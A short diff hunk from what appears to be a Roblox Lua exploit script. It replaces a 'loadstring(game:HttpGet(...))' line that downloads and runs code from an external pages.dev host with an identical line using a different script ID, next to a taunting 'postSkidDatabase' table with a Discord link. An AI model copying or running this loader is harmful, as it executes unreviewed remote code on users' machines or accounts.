@@ -312,7 +312,7 @@ end
 
 local deviousRes = runDeviousCalculation()
 
-loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5602765702007"))("5602765702007")
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=8789455104188"))("8789455104188")
 
 local postSkidDatabase = {
     "hahaha you actually scrolled past the loadstring lol: https://discord.gg/P2FEVBz2PG",
